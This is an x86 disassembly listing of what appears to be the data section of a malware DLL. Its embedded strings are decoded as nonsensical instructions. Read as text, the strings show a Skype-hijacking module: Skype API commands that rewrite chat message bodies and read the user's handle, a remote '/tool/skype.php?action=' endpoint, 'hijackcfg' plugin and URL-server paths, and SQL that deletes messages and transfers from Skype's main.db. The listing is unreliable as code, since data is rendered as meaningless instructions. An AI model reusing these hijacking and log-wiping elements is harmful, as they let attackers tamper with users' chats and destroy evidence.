1003B906: 0400                     ADD AL, 00H
1003B908: 243F                     AND AL, 3FH
1003B90A: 0400                     ADD AL, 00H
1003B90C: E63A                     OUT 3AH, AL
1003B90E: 0400                     ADD AL, 00H
1003B910: DA3A                     FIDIVR DWORD PTR [EDX]
1003B912: 0400                     ADD AL, 00H
1003B914: CE                       INTO 
1003B915: 3A0400                   CMP AL, [EAX+EAX]
1003B918: C23A04                   RETN 043AH
1003B91B: 00D4                     ADD AH, DL
1003B91D: 3C04                     CMP AL, 04H
1003B91F: 00B03A040000             ADD [EAX+0000043AH], DH
1003B925: 0000                     ADD [EAX], AL
1003B927: 0007                     ADD [EDI], AL
1003B929: 0000                     ADD [EAX], AL
1003B92B: 800600                   ADD BYTE PTR [ESI], 00H
1003B92E: 008002000080             ADD [EAX-7FFFFFFEH], AL
1003B934: 0000                     ADD [EAX], AL
1003B936: 0000                     ADD [EAX], AL
1003B938: 844104                   TEST AL, [ECX+04H]
1003B93B: 009A41040070             ADD [EDX+70000441H], BL
1003B941: 41                       INC ECX
1003B942: 0400                     ADD AL, 00H
1003B944: 0000                     ADD [EAX], AL
1003B946: 0000                     ADD [EAX], AL
1003B948: A4                       MOVSB 
1003B949: 43                       INC EBX
1003B94A: 0400                     ADD AL, 00H
1003B94C: AE                       SCASB 
1003B94D: 43                       INC EBX
1003B94E: 0400                     ADD AL, 00H
1003B950: 0000                     ADD [EAX], AL
1003B952: 0000                     ADD [EAX], AL
1003B954: 7040                     JO 1003B996H
1003B956: 0400                     ADD AL, 00H
1003B958: 7E40                     JLE 1003B99AH
1003B95A: 0400                     ADD AL, 00H
1003B95C: 8E4004                   MOV ES, [EAX+04H]
1003B95F: 009A400400A6             ADD [EDX-59FFFBC0H], BL
1003B965: 40                       INC EAX
1003B966: 0400                     ADD AL, 00H
1003B968: B440                     MOV AH, 40H
1003B96A: 0400                     ADD AL, 00H
1003B96C: C6400400                 MOV BYTE PTR [EAX+04H], 00H
1003B970: D6                       SETALC 
1003B971: 40                       INC EAX
1003B972: 0400                     ADD AL, 00H
1003B974: 60                       PUSHAD 
1003B975: 40                       INC EAX
1003B976: 0400                     ADD AL, 00H
1003B978: F040                     LOCK INC EAX
1003B97A: 0400                     ADD AL, 00H
1003B97C: FE4004                   INC BYTE PTR [EAX+04H]
1003B97F: 00963F040086             ADD [ESI-79FFFBC1H], DL
1003B985: 3F                       AAS 
1003B986: 0400                     ADD AL, 00H
1003B988: 723F                     JB 1003B9C9H
1003B98A: 0400                     ADD AL, 00H
1003B98C: 60                       PUSHAD 
1003B98D: 3F                       AAS 
1003B98E: 0400                     ADD AL, 00H
1003B990: 52                       PUSH EDX
1003B991: 3F                       AAS 
1003B992: 0400                     ADD AL, 00H
1003B994: 40                       INC EAX
1003B995: 3F                       AAS 
1003B996: 0400                     ADD AL, 00H
1003B998: 46                       INC ESI
1003B999: 40                       INC EAX
1003B99A: 0400                     ADD AL, 00H
1003B99C: 3A4004                   CMP AL, [EAX+04H]
1003B99F: 0026                     ADD [ESI], AH
1003B9A1: 40                       INC EAX
1003B9A2: 0400                     ADD AL, 00H
1003B9A4: 1440                     ADC AL, 40H
1003B9A6: 0400                     ADD AL, 00H
1003B9A8: 004004                   ADD [EAX+04H], AL
1003B9AB: 00E2                     ADD DL, AH
1003B9AD: 3F                       AAS 
1003B9AE: 0400                     ADD AL, 00H
1003B9B0: EE                       OUT DX, AL
1003B9B1: 3F                       AAS 
1003B9B2: 0400                     ADD AL, 00H
1003B9B4: D03F                     SAR BYTE PTR [EDI], 01H
1003B9B6: 0400                     ADD AL, 00H
1003B9B8: BA3F0400E2               MOV EDX, E200043FH
1003B9BD: 40                       INC EAX
1003B9BE: 0400                     ADD AL, 00H
1003B9C0: A6                       CMPSB 
1003B9C1: 3F                       AAS 
1003B9C2: 0400                     ADD AL, 00H
1003B9C4: 0000                     ADD [EAX], AL
1003B9C6: 0000                     ADD [EAX], AL
1003B9C8: CC                       INT 3 
1003B9C9: 42                       INC EDX
1003B9CA: 0400                     ADD AL, 00H
1003B9CC: 80430400                 ADD BYTE PTR [EBX+04H], 00H
1003B9D0: 6A43                     PUSH 00000043H
1003B9D2: 0400                     ADD AL, 00H
1003B9D4: 5A                       POP EDX
1003B9D5: 43                       INC EBX
1003B9D6: 0400                     ADD AL, 00H
1003B9D8: 46                       INC ESI
1003B9D9: 43                       INC EBX
1003B9DA: 0400                     ADD AL, 00H
1003B9DC: 324304                   XOR AL, [EBX+04H]
1003B9DF: 001E                     ADD [ESI], BL
1003B9E1: 43                       INC EBX
1003B9E2: 0400                     ADD AL, 00H
1003B9E4: 084304                   OR [EBX+04H], AL
1003B9E7: 00F4                     ADD AH, DH
1003B9E9: 42                       INC EDX
1003B9EA: 0400                     ADD AL, 00H
1003B9EC: E042                     LOOPNZ 1003BA30H
1003B9EE: 0400                     ADD AL, 00H
1003B9F0: B8420400A6               MOV EAX, A6000442H
1003B9F5: 42                       INC EDX
1003B9F6: 0400                     ADD AL, 00H
1003B9F8: 96                       XCHG ESI, EAX
1003B9F9: 42                       INC EDX
1003B9FA: 0400                     ADD AL, 00H
1003B9FC: 0000                     ADD [EAX], AL
1003B9FE: 0000                     ADD [EAX], AL
1003BA00: 80420400                 ADD BYTE PTR [EDX+04H], 00H
1003BA04: 7842                     JS 1003BA48H
1003BA06: 0400                     ADD AL, 00H
1003BA08: 6E                       OUTSB 
1003BA09: 42                       INC EDX
1003BA0A: 0400                     ADD AL, 00H
1003BA0C: E443                     IN AL, 43H
1003BA0E: 0400                     ADD AL, 00H
1003BA10: 6442                     INC EDX
1003BA12: 0400                     ADD AL, 00H
1003BA14: 54                       PUSH ESP
1003BA15: 42                       INC EDX
1003BA16: 0400                     ADD AL, 00H
1003BA18: 4A                       DEC EDX
1003BA19: 42                       INC EDX
1003BA1A: 0400                     ADD AL, 00H
1003BA1C: 3A4204                   CMP AL, [EDX+04H]
1003BA1F: 0030                     ADD [EAX], DH
1003BA21: 42                       INC EDX
1003BA22: 0400                     ADD AL, 00H
1003BA24: 2642                     INC EDX
1003BA26: 0400                     ADD AL, 00H
1003BA28: 1E                       PUSH DS
1003BA29: 42                       INC EDX
1003BA2A: 0400                     ADD AL, 00H
1003BA2C: 16                       PUSH SS
1003BA2D: 42                       INC EDX
1003BA2E: 0400                     ADD AL, 00H
1003BA30: DA4304                   FIADD DWORD PTR [EBX+04H]
1003BA33: 00D0                     ADD AL, DL
1003BA35: 43                       INC EBX
1003BA36: 0400                     ADD AL, 00H
1003BA38: C6430400                 MOV BYTE PTR [EBX+04H], 00H
1003BA3C: 0000                     ADD [EAX], AL
1003BA3E: 0000                     ADD [EAX], AL
1003BA40: CC                       INT 3 
1003BA41: 41                       INC ECX
1003BA42: 0400                     ADD AL, 00H
1003BA44: DE4104                   FIADD WORD PTR [ECX+04H]
1003BA47: 00EE                     ADD DH, CH
1003BA49: 41                       INC ECX
1003BA4A: 0400                     ADD AL, 00H
1003BA4C: B841040000               MOV EAX, 00000441H
1003BA51: 0000                     ADD [EAX], AL
1003BA53: 0000                     ADD [EAX], AL
1003BA55: 0000                     ADD [EAX], AL
1003BA57: 00E6                     ADD DH, AH
1003BA59: 1402                     ADC AL, 02H
1003BA5B: 0000                     ADD [EAX], AL
1003BA5D: 0000                     ADD [EAX], AL
1003BA5F: 00C0                     ADD AL, AL
1003BA61: 0000                     ADD [EAX], AL
1003BA63: 0000                     ADD [EAX], AL
1003BA65: 0000                     ADD [EAX], AL
1003BA67: 46                       INC ESI
1003BA68: 0E                       PUSH CS
1003BA69: 0100                     ADD [EAX], EAX
1003BA6B: 0000                     ADD [EAX], AL
1003BA6D: 0000                     ADD [EAX], AL
1003BA6F: 00C0                     ADD AL, AL
1003BA71: 0000                     ADD [EAX], AL
1003BA73: 0000                     ADD [EAX], AL
1003BA75: 0000                     ADD [EAX], AL
1003BA77: 46                       INC ESI
1003BA78: 7C7C                     JL 1003BAF6H
1003BA7A: 7C00                     JL 1003BA7CH
1003BA7C: 0000                     ADD [EAX], AL
1003BA7E: 0000                     ADD [EAX], AL
1003BA80: 4D                       DEC EBP
1003BA81: 6F                       OUTSD 
1003BA82: 7A69                     JPE 1003BAEDH
1003BA84: 6C                       INSB 
1003BA85: 6C                       INSB 
1003BA86: 61                       POPAD 
1003BA87: 2F                       DAS 
1003BA88: 342E                     XOR AL, 2EH
1003BA8A: 3020                     XOR [EAX], AH
1003BA8C: 28636F                   SUB [EBX+6FH], AH
1003BA8F: 6D                       INSD 
1003BA90: 7061                     JO 1003BAF3H
1003BA92: 7469                     JZ 1003BAFDH
1003BA94: 626C653B                 BOUND EBP, [EBP+*2]
1003BA98: 204D53                   AND [EBP+53H], CL
1003BA9B: 49                       DEC ECX
1003BA9C: 45                       INC EBP
1003BA9D: 2036                     AND [ESI], DH
1003BA9F: 2E303B                   XOR CS:[EBX], BH
1003BAA2: 205769                   AND [EDI+69H], DL
1003BAA5: 6E                       OUTSB 
1003BAA6: 646F                     OUTSD 
1003BAA8: 7773                     JNBE 1003BB1DH
1003BAAA: 204E54                   AND [ESI+54H], CL
1003BAAD: 20352E313B20             AND [203B312EH], DH
1003BAB3: 53                       PUSH EBX
1003BAB4: 56                       PUSH ESI
1003BAB5: 313B                     XOR [EBX], EDI
1003BAB7: 202E                     AND [ESI], CH
1003BAB9: 4E                       DEC ESI
1003BABA: 45                       INC EBP
1003BABB: 54                       PUSH ESP
1003BABC: 20434C                   AND [EBX+4CH], AL
1003BABF: 52                       PUSH EDX
1003BAC0: 2031                     AND [ECX], DH
1003BAC2: 2E302E                   XOR CS:[ESI], CH
1003BAC5: 3337                     XOR ESI, [EDI]
1003BAC7: 303529000048             XOR [48000029H], DH
1003BACD: 45                       INC EBP
1003BACE: 41                       INC ECX
1003BACF: 44                       INC ESP
1003BAD0: 0000                     ADD [EAX], AL
1003BAD2: 0000                     ADD [EAX], AL
1003BAD4: 6E                       OUTSB 
1003BAD5: 61                       POPAD 
1003BAD6: 6D                       INSD 
1003BAD7: 650000                   ADD GS:[EAX], AL
1003BADA: 0000                     ADD [EAX], AL
1003BADC: 2F                       DAS 
1003BADD: 68696A6163               PUSH 63616A69H
1003BAE2: 6B636667                 IMUL ESP, [EBX+66H], 67H
1003BAE6: 2F                       DAS 
1003BAE7: 706C                     JO 1003BB55H
1003BAE9: 7567                     JNZ 1003BB52H
1003BAEB: 696E732F706C75           IMUL EBP, [ESI+73H], 756C702FH
1003BAF2: 67696E0000007572         IMUL EBP, [BP], 72750000H
1003BAFA: 6C                       INSB 
1003BAFB: 002F                     ADD [EDI], CH
1003BAFD: 68696A6163               PUSH 63616A69H
1003BB02: 6B636667                 IMUL ESP, [EBX+66H], 67H
1003BB06: 2F                       DAS 
1003BB07: 7572                     JNZ 1003BB7BH
1003BB09: 6C                       INSB 
1003BB0A: 735F                     JNB 1003BB6BH
1003BB0C: 7365                     JNB 1003BB73H
1003BB0E: 7276                     JB 1003BB86H
1003BB10: 65722F                   JB 1003BB42H
1003BB13: 7572                     JNZ 1003BB87H
1003BB15: 6C                       INSB 
1003BB16: 5F                       POP EDI
1003BB17: 7365                     JNB 1003BB7EH
1003BB19: 7276                     JB 1003BB91H
1003BB1B: 657200                   JB 1003BB1EH
1003BB1E: 0000                     ADD [EAX], AL
1003BB20: 2500530000               AND EAX, 00005300H
1003BB25: 0000                     ADD [EAX], AL
1003BB27: 005300                   ADD [EBX], DL
1003BB2A: 54                       PUSH ESP
1003BB2B: 004100                   ADD [ECX], AL
1003BB2E: 54                       PUSH ESP
1003BB2F: 005500                   ADD [EBP], DL
1003BB32: 53                       PUSH EBX
1003BB33: 0000                     ADD [EAX], AL
1003BB35: 0000                     ADD [EAX], AL
1003BB37: 005300                   ADD [EBX], DL
1003BB3A: 45                       INC EBP
1003BB3B: 004E00                   ADD [ESI], CL
1003BB3E: 54                       PUSH ESP
1003BB3F: 0000                     ADD [EAX], AL
1003BB41: 0000                     ADD [EAX], AL
1003BB43: 005300                   ADD [EBX], DL
1003BB46: 45                       INC EBP
1003BB47: 004E00                   ADD [ESI], CL
1003BB4A: 44                       INC ESP
1003BB4B: 004900                   ADD [ECX], CL
1003BB4E: 4E                       DEC ESI
1003BB4F: 004700                   ADD [EDI], AL
1003BB52: 0000                     ADD [EAX], AL
1003BB54: 53                       PUSH EBX
1003BB55: 45                       INC EBP
1003BB56: 54                       PUSH ESP
1003BB57: 204348                   AND [EBX+48H], AL
1003BB5A: 41                       INC ECX
1003BB5B: 54                       PUSH ESP
1003BB5C: 4D                       DEC EBP
1003BB5D: 45                       INC EBP
1003BB5E: 53                       PUSH EBX
1003BB5F: 53                       PUSH EBX
1003BB60: 41                       INC ECX
1003BB61: 47                       INC EDI
1003BB62: 45                       INC EBP
1003BB63: 20255320424F             AND [4F422053H], AH
1003BB69: 44                       INC ESP
1003BB6A: 59                       POP ECX
1003BB6B: 2020                     AND [EAX], AH
1003BB6D: 0000                     ADD [EAX], AL
1003BB6F: 005200                   ADD [EDX], DL
1003BB72: 45                       INC EBP
1003BB73: 004300                   ADD [EBX], AL
1003BB76: 45                       INC EBP
1003BB77: 004900                   ADD [ECX], CL
1003BB7A: 56                       PUSH ESI
1003BB7B: 004500                   ADD [EBP], AL
1003BB7E: 44                       INC ESP
1003BB7F: 0000                     ADD [EAX], AL
1003BB81: 0000                     ADD [EAX], AL
1003BB83: 005345                   ADD [EBX+45H], DL
1003BB86: 54                       PUSH ESP
1003BB87: 204348                   AND [EBX+48H], AL
1003BB8A: 41                       INC ECX
1003BB8B: 54                       PUSH ESP
1003BB8C: 4D                       DEC EBP
1003BB8D: 45                       INC EBP
1003BB8E: 53                       PUSH EBX
1003BB8F: 53                       PUSH EBX
1003BB90: 41                       INC ECX
1003BB91: 47                       INC EDI
1003BB92: 45                       INC EBP
1003BB93: 202553205345             AND [45532053H], AH
1003BB99: 45                       INC EBP
1003BB9A: 4E                       DEC ESI
1003BB9B: 005200                   ADD [EDX], DL
1003BB9E: 45                       INC EBP
1003BB9F: 004100                   ADD [ECX], AL
1003BBA2: 44                       INC ESP
1003BBA3: 0000                     ADD [EAX], AL
1003BBA5: 0000                     ADD [EAX], AL
1003BBA7: 004745                   ADD [EDI+45H], AL
1003BBAA: 54                       PUSH ESP
1003BBAB: 204D45                   AND [EBP+45H], CL
1003BBAE: 53                       PUSH EBX
1003BBAF: 53                       PUSH EBX
1003BBB0: 41                       INC ECX
1003BBB1: 47                       INC EDI
1003BBB2: 45                       INC EBP
1003BBB3: 202553205041             AND [41502053H], AH
1003BBB9: 52                       PUSH EDX
1003BBBA: 54                       PUSH ESP
1003BBBB: 4E                       DEC ESI
1003BBBC: 45                       INC EBP
1003BBBD: 52                       PUSH EDX
1003BBBE: 5F                       POP EDI
1003BBBF: 44                       INC ESP
1003BBC0: 49                       DEC ECX
1003BBC1: 53                       PUSH EBX
1003BBC2: 50                       PUSH EAX
1003BBC3: 4E                       DEC ESI
1003BBC4: 41                       INC ECX
1003BBC5: 4D                       DEC EBP
1003BBC6: 45                       INC EBP
1003BBC7: 004D00                   ADD [EBP], CL
1003BBCA: 45                       INC EBP
1003BBCB: 005300                   ADD [EBX], DL
1003BBCE: 53                       PUSH EBX
1003BBCF: 004100                   ADD [ECX], AL
1003BBD2: 47                       INC EDI
1003BBD3: 004500                   ADD [EBP], AL
1003BBD6: 0000                     ADD [EAX], AL
1003BBD8: 50                       PUSH EAX
1003BBD9: 004100                   ADD [ECX], AL
1003BBDC: 52                       PUSH EDX
1003BBDD: 0054004E                 ADD [EAX+EAX+4EH], DL
1003BBE1: 004500                   ADD [EBP], AL
1003BBE4: 52                       PUSH EDX
1003BBE5: 005F00                   ADD [EDI], BL
1003BBE8: 44                       INC ESP
1003BBE9: 004900                   ADD [ECX], CL
1003BBEC: 53                       PUSH EBX
1003BBED: 005000                   ADD [EAX], DL
1003BBF0: 4E                       DEC ESI
1003BBF1: 004100                   ADD [ECX], AL
1003BBF4: 4D                       DEC EBP
1003BBF5: 004500                   ADD [EBP], AL
1003BBF8: 0000                     ADD [EAX], AL
1003BBFA: 0000                     ADD [EAX], AL
1003BBFC: 47                       INC EDI
1003BBFD: 45                       INC EBP
1003BBFE: 54                       PUSH ESP
1003BBFF: 204355                   AND [EBX+55H], AL
1003BC02: 52                       PUSH EDX
1003BC03: 52                       PUSH EDX
1003BC04: 45                       INC EBP
1003BC05: 4E                       DEC ESI
1003BC06: 54                       PUSH ESP
1003BC07: 55                       PUSH EBP
1003BC08: 53                       PUSH EBX
1003BC09: 45                       INC EBP
1003BC0A: 52                       PUSH EDX
1003BC0B: 48                       DEC EAX
1003BC0C: 41                       INC ECX
1003BC0D: 4E                       DEC ESI
1003BC0E: 44                       INC ESP
1003BC0F: 4C                       DEC ESP
1003BC10: 45                       INC EBP
1003BC11: 0000                     ADD [EAX], AL
1003BC13: 00536B                   ADD [EBX+6BH], DL
1003BC16: 7970                     JNS 1003BC88H
1003BC18: 6543                     INC EBX
1003BC1A: 6F                       OUTSD 
1003BC1B: 6E                       OUTSB 
1003BC1C: 7472                     JZ 1003BC90H
1003BC1E: 6F                       OUTSD 
1003BC1F: 6C                       INSB 
1003BC20: 41                       INC ECX
1003BC21: 50                       PUSH EAX
1003BC22: 49                       DEC ECX
1003BC23: 41                       INC ECX
1003BC24: 7474                     JZ 1003BC9AH
1003BC26: 61                       POPAD 
1003BC27: 636800                   ARPL EBP, [EAX]
1003BC2A: 0000                     ADD [EAX], AL
1003BC2C: 53                       PUSH EBX
1003BC2D: 6B797065                 IMUL EDI, [ECX+70H], 65H
1003BC31: 43                       INC EBX
1003BC32: 6F                       OUTSD 
1003BC33: 6E                       OUTSB 
1003BC34: 7472                     JZ 1003BCA8H
1003BC36: 6F                       OUTSD 
1003BC37: 6C                       INSB 
1003BC38: 41                       INC ECX
1003BC39: 50                       PUSH EAX
1003BC3A: 49                       DEC ECX
1003BC3B: 44                       INC ESP
1003BC3C: 6973636F766572           IMUL ESI, [EBX+63H], 7265766FH
1003BC43: 00536B                   ADD [EBX+6BH], DL
1003BC46: 7057                     JO 1003BC9FH
1003BC48: 6E                       OUTSB 
1003BC49: 640000                   ADD FS:[EAX], AL
1003BC4C: 65006300                 ADD GS:[EBX], AH
1003BC50: 68006F0031               PUSH 31006F00H
1003BC55: 0032                     ADD [EDX], DH
1003BC57: 0033                     ADD [EBX], DH
1003BC59: 0000                     ADD [EAX], AL
1003BC5B: 00545A61                 ADD [EDX+EBX*2+61H], DL
1003BC5F: 7043                     JO 1003BCA4H
1003BC61: 6F                       OUTSD 
1003BC62: 6D                       INSD 
1003BC63: 6D                       INSD 
1003BC64: 756E                     JNZ 1003BCD4H
1003BC66: 696361746F7200           IMUL ESP, [EBX+61H], 00726F74H
1003BC6D: 0000                     ADD [EAX], AL
1003BC6F: 0054436F                 ADD [EBX+EAX*2+6FH], DL
1003BC73: 6D                       INSD 
1003BC74: 6D                       INSD 
1003BC75: 756E                     JNZ 1003BCE5H
1003BC77: 696361746F7246           IMUL ESP, [EBX+61H], 46726F74H
1003BC7E: 6F                       OUTSD 
1003BC7F: 726D                     JB 1003BCEEH
1003BC81: 0000                     ADD [EAX], AL
1003BC83: 0074536B                 ADD [EBX+EDX*2+6BH], DH
1003BC87: 4D                       DEC EBP
1003BC88: 61                       POPAD 
1003BC89: 696E466F726D00           IMUL EBP, [ESI+46H], 006D726FH
1003BC90: 3100                     XOR [EAX], EAX
1003BC92: 0000                     ADD [EAX], AL
1003BC94: 3000                     XOR [EAX], AL
1003BC96: 0000                     ADD [EAX], AL
1003BC98: 5C                       POP ESP
1003BC99: 005300                   ADD [EBX], DL
1003BC9C: 6B0079                   IMUL EAX, [EAX], 79H
1003BC9F: 007000                   ADD [EAX], DH
1003BCA2: 65005C0025               ADD GS:[EAX+EAX+25H], BL
1003BCA7: 007300                   ADD [EBX], DH
1003BCAA: 5C                       POP ESP
1003BCAB: 006D00                   ADD [EBP], CH
1003BCAE: 61                       POPAD 
1003BCAF: 006900                   ADD [ECX], CH
1003BCB2: 6E                       OUTSB 
1003BCB3: 002E                     ADD [ESI], CH
1003BCB5: 00640062                 ADD [EAX+EAX+62H], AH
1003BCB9: 0000                     ADD [EAX], AL
1003BCBB: 0064656C                 ADD AH, [EBP+*2]
1003BCBF: 657465                   JZ 1003BD27H
1003BCC2: 206672                   AND [ESI+72H], AH
1003BCC5: 6F                       OUTSD 
1003BCC6: 6D                       INSD 
1003BCC7: 204D65                   AND [EBP+65H], CL
1003BCCA: 7373                     JNB 1003BD3FH
1003BCCC: 61                       POPAD 
1003BCCD: 67657300                 JNB 1003BCD1H
1003BCD1: 0000                     ADD [EAX], AL
1003BCD3: 0064656C                 ADD AH, [EBP+*2]
1003BCD7: 657465                   JZ 1003BD3FH
1003BCDA: 206672                   AND [ESI+72H], AH
1003BCDD: 6F                       OUTSD 
1003BCDE: 6D                       INSD 
1003BCDF: 20547261                 AND [EDX+ESI*2+61H], DL
1003BCE3: 6E                       OUTSB 
1003BCE4: 7366                     JNB 1003BD4CH
1003BCE6: 657273                   JB 1003BD5CH
1003BCE9: 0000                     ADD [EAX], AL
1003BCEB: 0000                     ADD [EAX], AL
1003BCED: 0000                     ADD [EAX], AL
1003BCEF: 007300                   ADD [EBX], DH
1003BCF2: 6F                       OUTSD 
1003BCF3: 007500                   ADD [EBP], DH
1003BCF6: 6E                       OUTSB 
1003BCF7: 00640061                 ADD [EAX+EAX+61H], AH
1003BCFB: 006C0065                 ADD [EAX+EAX+65H], CH
1003BCFF: 007200                   ADD [EDX], DH
1003BD02: 7400                     JZ 1003BD04H
1003BD04: 7300                     JNB 1003BD06H
1003BD06: 0000                     ADD [EAX], AL
1003BD08: 54                       PUSH ESP
1003BD09: 005000                   ADD [EAX], DL
1003BD0C: 61                       POPAD 
1003BD0D: 006E00                   ADD [ESI], CH
1003BD10: 65006C0000               ADD GS:[EAX+EAX], CH
1003BD15: 0000                     ADD [EAX], AL
1003BD17: 0054004F                 ADD [EAX+EAX+4FH], DL
1003BD1B: 007000                   ADD [EAX], DH
1003BD1E: 7400                     JZ 1003BD20H
1003BD20: 69006F006E00             IMUL EAX, [EAX], 006E006FH
1003BD26: 7300                     JNB 1003BD28H
1003BD28: 46                       INC ESI
1003BD29: 006F00                   ADD [EDI], CH
1003BD2C: 7200                     JB 1003BD2EH
1003BD2E: 6D                       INSD 
1003BD2F: 0000                     ADD [EAX], AL
1003BD31: 0000                     ADD [EAX], AL
1003BD33: 0054004E                 ADD [EAX+EAX+4EH], DL
1003BD37: 006100                   ADD [ECX], AH
1003BD3A: 7600                     JBE 1003BD3CH
1003BD3C: 690067006100             IMUL EAX, [EAX], 00610067H
1003BD42: 6200                     BOUND EAX, [EAX]
1003BD44: 6C                       INSB 
1003BD45: 006500                   ADD [EBP], AH
1003BD48: 42                       INC EDX
1003BD49: 007500                   ADD [EBP], DH
1003BD4C: 7400                     JZ 1003BD4EH
1003BD4E: 7400                     JZ 1003BD50H
1003BD50: 6F                       OUTSD 
1003BD51: 006E00                   ADD [ESI], CH
1003BD54: 0000                     ADD [EAX], AL
1003BD56: 0000                     ADD [EAX], AL
1003BD58: 54                       PUSH ESP
1003BD59: 005300                   ADD [EBX], DL
1003BD5C: 6300                     ARPL EAX, [EAX]
1003BD5E: 7200                     JB 1003BD60H
1003BD60: 6F                       OUTSD 
1003BD61: 006C006C                 ADD [EAX+EAX+6CH], CH
1003BD65: 004200                   ADD [EDX], AL
1003BD68: 6F                       OUTSD 
1003BD69: 007800                   ADD [EAX], BH
1003BD6C: 0000                     ADD [EAX], AL
1003BD6E: 0000                     ADD [EAX], AL
1003BD70: 54                       PUSH ESP
1003BD71: 005000                   ADD [EAX], DL
1003BD74: 61                       POPAD 
1003BD75: 006700                   ADD [EDI], AH
1003BD78: 65004300                 ADD GS:[EBX], AL
1003BD7C: 6F                       OUTSD 
1003BD7D: 006E00                   ADD [ESI], CH
1003BD80: 7400                     JZ 1003BD82H
1003BD82: 7200                     JB 1003BD84H
1003BD84: 6F                       OUTSD 
1003BD85: 006C0000                 ADD [EAX+EAX], CH
1003BD89: 0000                     ADD [EAX], AL
1003BD8B: 005200                   ADD [EDX], DL
1003BD8E: 69006E006700             IMUL EAX, [EAX], 0067006EH
1003BD94: 7400                     JZ 1003BD96H
1003BD96: 6F                       OUTSD 
1003BD97: 006E00                   ADD [ESI], CH
1003BD9A: 65007300                 ADD GS:[EBX], DH
1003BD9E: 54                       PUSH ESP
1003BD9F: 006100                   ADD [ECX], AH
1003BDA2: 6200                     BOUND EAX, [EAX]
1003BDA4: 0000                     ADD [EAX], AL
1003BDA6: 0000                     ADD [EAX], AL
1003BDA8: 54                       PUSH ESP
1003BDA9: 00540061                 ADD [EAX+EAX+61H], DL
1003BDAD: 006200                   ADD [EDX], AH
1003BDB0: 53                       PUSH EBX
1003BDB1: 006800                   ADD [EAX], CH
1003BDB4: 65006500                 ADD GS:[EBP], AH
1003BDB8: 7400                     JZ 1003BDBAH
1003BDBA: 0000                     ADD [EAX], AL
1003BDBC: 54                       PUSH ESP
1003BDBD: 004100                   ADD [ECX], AL
1003BDC0: 6300                     ARPL EAX, [EAX]
1003BDC2: 6300                     ARPL EAX, [EAX]
1003BDC4: 65007300                 ADD GS:[EBX], DH
1003BDC8: 7300                     JNB 1003BDCAH
1003BDCA: 690062006C00             IMUL EAX, [EAX], 006C0062H
1003BDD0: 65004300                 ADD GS:[EBX], AL
1003BDD4: 6800650063               PUSH 63006500H
1003BDD9: 006B00                   ADD [EBX], CH
1003BDDC: 4C                       DEC ESP
1003BDDD: 006900                   ADD [ECX], CH
1003BDE0: 7300                     JNB 1003BDE2H
1003BDE2: 7400                     JZ 1003BDE4H
1003BDE4: 42                       INC EDX
1003BDE5: 006F00                   ADD [EDI], CH
1003BDE8: 7800                     JS 1003BDEAH
1003BDEA: 0000                     ADD [EAX], AL
1003BDEC: 54                       PUSH ESP
1003BDED: 004300                   ADD [EBX], AL
1003BDF0: 6F                       OUTSD 
1003BDF1: 006E00                   ADD [ESI], CH
1003BDF4: 7600                     JBE 1003BDF6H
1003BDF6: 65007200                 ADD GS:[EDX], DH
1003BDFA: 7300                     JNB 1003BDFCH
1003BDFC: 61                       POPAD 
1003BDFD: 00740069                 ADD [EAX+EAX+69H], DH
1003BE01: 006F00                   ADD [EDI], CH
1003BE04: 6E                       OUTSB 
1003BE05: 004600                   ADD [ESI], AL
1003BE08: 6F                       OUTSD 
1003BE09: 007200                   ADD [EDX], DH
1003BE0C: 6D                       INSD 
1003BE0D: 0000                     ADD [EAX], AL
1003BE0F: 00740053                 ADD [EAX+EAX+53H], DH
1003BE13: 006B00                   ADD [EBX], CH
1003BE16: 4D                       DEC EBP
1003BE17: 006100                   ADD [ECX], AH
1003BE1A: 69006E004600             IMUL EAX, [EAX], 0046006EH
1003BE20: 6F                       OUTSD 
1003BE21: 007200                   ADD [EDX], DH
1003BE24: 6D                       INSD 
1003BE25: 0000                     ADD [EAX], AL
1003BE27: 00540048                 ADD [EAX+EAX+48H], DL
1003BE2B: 006F00                   ADD [EDI], CH
1003BE2E: 6D                       INSD 
1003BE2F: 006500                   ADD [EBP], AH
1003BE32: 46                       INC ESI
1003BE33: 006F00                   ADD [EDI], CH
1003BE36: 7200                     JB 1003BE38H
1003BE38: 6D                       INSD 
1003BE39: 0000                     ADD [EAX], AL
1003BE3B: 00544368                 ADD [EBX+EAX*2+68H], DL
1003BE3F: 61                       POPAD 
1003BE40: 7452                     JZ 1003BE94H
1003BE42: 69636845646974           IMUL ESP, [EBX+68H], 74696445H
1003BE49: 0000                     ADD [EAX], AL
1003BE4B: 00544368                 ADD [EBX+EAX*2+68H], DL
1003BE4F: 61                       POPAD 
1003BE50: 7445                     JZ 1003BE97H
1003BE52: 6E                       OUTSB 
1003BE53: 7472                     JZ 1003BEC7H
1003BE55: 7943                     JNS 1003BE9AH
1003BE57: 6F                       OUTSD 
1003BE58: 6E                       OUTSB 
1003BE59: 7472                     JZ 1003BECDH
1003BE5B: 6F                       OUTSD 
1003BE5C: 6C                       INSB 
1003BE5D: 0000                     ADD [EAX], AL
1003BE5F: 0023                     ADD [EBX], AH
1003BE61: 0000                     ADD [EAX], AL
1003BE63: 002F                     ADD [EDI], CH
1003BE65: 0074006F                 ADD [EAX+EAX+6FH], DH
1003BE69: 006F00                   ADD [EDI], CH
1003BE6C: 6C                       INSB 
1003BE6D: 002F                     ADD [EDI], CH
1003BE6F: 007300                   ADD [EBX], DH
1003BE72: 6B0079                   IMUL EAX, [EAX], 79H
1003BE75: 007000                   ADD [EAX], DH
1003BE78: 65002E                   ADD GS:[ESI], CH
1003BE7B: 007000                   ADD [EAX], DH
1003BE7E: 680070003F               PUSH 3F007000H
1003BE83: 006100                   ADD [ECX], AH
1003BE86: 6300                     ARPL EAX, [EAX]
1003BE88: 7400                     JZ 1003BE8AH
1003BE8A: 69006F006E00             IMUL EAX, [EAX], 006E006FH
1003BE90: 3D00250073               CMP EAX, 73002500H
1003BE95: 0000                     ADD [EAX], AL
1003BE97: 0026                     ADD [ESI], AH
1003BE99: 0000                     ADD [EAX], AL
1003BE9B: 0000                     ADD [EAX], AL
1003BE9D: 0000                     ADD [EAX], AL
1003BE9F: 004D00                   ADD [EBP], CL
1003BEA2: 6F                       OUTSD 
1003BEA3: 007A00                   ADD [EDX], BH
1003BEA6: 69006C006C00             IMUL EAX, [EAX], 006C006CH
1003BEAC: 61                       POPAD 
1003BEAD: 002F                     ADD [EDI], CH
1003BEAF: 003400                   ADD [EAX+EAX], DH
1003BEB2: 2E0030                   ADD CS:[EAX], DH
1003BEB5: 0020                     ADD [EAX], AH
1003BEB7: 0028                     ADD [EAX], CH
